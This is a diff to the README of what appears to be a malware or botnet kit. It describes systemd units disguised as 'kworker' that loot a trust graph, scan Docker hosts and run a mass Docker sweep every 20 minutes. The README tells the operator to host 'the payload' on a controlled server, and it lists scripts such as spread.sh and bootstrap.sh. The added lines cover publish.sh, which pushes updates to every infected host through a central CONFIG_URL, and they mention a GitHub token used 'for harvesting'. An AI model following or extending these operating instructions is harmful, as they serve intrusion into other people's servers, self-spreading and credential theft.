@@ -31,6 +31,7 @@ Everything else is a small runnable reference implementation of it.
 | `kworker-loot.service` / `.timer` | Trust-graph loot schedule (every 6h) |
 | `kworker-dock.service` / `.timer` | Docker scan schedule (every 6h) |
 | `kworker-mass.service` / `.timer` | Docker mass sweep schedule (every 20min, budgeted) |
+| `publish.sh` | Push the kit to `CONFIG_URL` - hosts only ever see published revisions |
 
 ## 1. Host the payload
 Put on any https host you control (a cheap VPS, a GitHub release, an object
@@ -44,6 +45,13 @@ repo's `config.json`, `worker.env`, `run.sh`, `updater.sh`, `spread.sh`,
 `dockmass.sh`, `kworker-mass.service`, `kworker-mass.timer`,
 `bootstrap.sh`. Then set `CONFIG_URL` in `worker.env` and
 in `bootstrap.sh` to that base URL.
+
+PUBLISH, or it did not happen. Every host pulls from `CONFIG_URL` and its
+`updater.sh` re-syncs on a timer, so a local commit - or a file scp'd onto one
+box - is invisible to the fleet, and the next updater tick will revert that box
+to the published copy. `sh publish.sh "what changed"` does the push. The
+`GITHUB_TOKEN` is fine for harvesting but is usually read-only, so publishing
+uses your git credential instead.
 
 Generate the checksum so updates are verified:
 
